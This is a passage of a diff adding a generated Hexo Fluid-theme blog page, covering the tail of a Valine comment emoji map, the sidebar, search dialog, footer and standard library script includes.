ec7e287cdf201ded27b065b9.png","嗑瓜子":"28a91da1685d90124cfeead74622e1ebb417c0eb.png","笑哭":"c3043ba94babf824dea03ce500d0e73763bf4f40.png","藏狐":"ba0937ef6f3ccca85e2e0047e6263f3b4da37201.png","脸红":"0922c375da40e6b69002bd89b858572f424dcfca.png","给心心":"1597302b98827463f5b75c7cac1f29ea6ce572c4.png","嘟嘟":"abd7404537d8162720ccbba9e0a8cdf75547e07a.png","哦呼":"362bded07ea5434886271d23fa25f5d85d8af06c.png","喜欢":"8a10a4d73a89f665feff3d46ca56e83dc68f9eb8.png","酸了":"92b1c8cbceea3ae0e8e32253ea414783e8ba7806.png","嫌弃":"de4c0783aaa60ec03de0a2b90858927bfad7154b.png","大哭":"2caafee2e5db4db72104650d87810cc2c123fc86.png","害羞":"9d2ec4e1fbd6cb1b4d12d2bbbdd124ccb83ddfda.png","疑惑":"b7840db4b1f9f4726b7cb23c0972720c1698d661.png","喜极而泣":"485a7e0c01c2d70707daae53bee4a9e2e31ef1ed.png","奸笑":"bb84906573472f0a84cebad1e9000eb6164a6f5a.png","阴险":"ba8d5f8e7d136d59aab52c40fd3b8a43419eb03c.png","囧":"12e41d357a9807cc80ef1e1ed258127fcc791424.png","呆":"33ad6000d9f9f168a0976bc60937786f239e5d8c.png","大笑":"ca94ad1c7e6dac895eb5b33b7836b634c614d1c0.png","惊喜":"0afecaf3a3499479af946f29749e1a6c285b6f65.png","doge_金箍":"aadaca1895e09c5596fc6365192ec93a23718cf0.png","奋斗":"bb2060c15dba7d3fd731c35079d1617f1afe3376.png","哈欠":"888d877729cbec444ddbd1cf4c9af155a7a06086.png","抓狂":"4c87afff88c22439c45b79e9d2035d21d5622eba.png","偷笑":"6c49d226e76c42cd8002abc47b3112bc5a92f66a.png","惊讶":"f8e9a59cad52ae1a19622805696a35f0a0d853f3.png","抠鼻":"cb89184c97e3f6d50acfd7961c313ce50360d70f.png","捂脸":"6921bb43f0c634870b92f4a8ad41dada94a5296d.png","无语":"44667b7d9349957e903b1b62cb91fb9b13720f04.png","点赞":"1a67265993913f4c35d15a6028a30724e83e7d35.png","笑":"81edf17314cea3b48674312b4364df44d5c01f17.png","傲娇":"010540d0f61220a0db4922e4a679a1d8eca94f4e.png","冷":"cb0ebbd0668640f07ebfc0e03f7a18a8cd00b4ed.png","委屈":"d2f26cbdd6c96960320af03f5514c5b524990840.png","尴尬":"cb321684ed5ce6eacdc2699092ab8fe7679e4fda.png","生气":"3195714219c4b582a4fb02033dd1519913d0246d.png","生病":"0f25ce04ae1d7baf98650986454c634f6612cb76.png","疼":"905fd9a99ec316e353b9bd4ecd49a5f0a301eabf.png","鼓掌":"895d1fc616b4b6c830cf96012880818c0e1de00d.png","保佑":"fafe8d3de0dc139ebe995491d2dac458a865fb30.png","加油":"c7aaeacb21e107292d3bb053e5abde4a4459ed30.png","响指":"1b5c53cf14336903e1d2ae3527ca380a1256a077.png","嘘声":"e64af664d20716e090f10411496998095f62f844.png","墨镜":"3a03aebfc06339d86a68c2d893303b46f4b85771.png","思考":"cfa9b7e89e4bfe04bbcd34ccb1b0df37f4fa905c.png","抱拳":"89516218158dbea18ab78e8873060bf95d33bbbe.png","捂眼":"c5c6d6982e1e53e478daae554b239f2b227b172b.png","撇嘴":"531863568e5668c5ac181d395508a0eeb1f0cda4.png","支持":"3c210366a5585706c09d4c686a9d942b39feeb50.png","生气_金箍":"fb3fbcf44157a5ba460b62341a86b38c11e7a664.png","胜利":"b49fa9f4b1e7c3477918153b82c60b114d87347c.png","难过":"a651db36701610aa70a781fa98c07c9789b11543.png","雪花":"a41813c4edf8782047e172c884ebd4507ce5e449.png","黑眼圈_金箍":"3d8edacc6efa4bc397642ee2bdc688c2eb976b4f.png"},"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://equinox-shame.github.io" target="_blank" rel="nofollow noopener"><span>梓曰</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
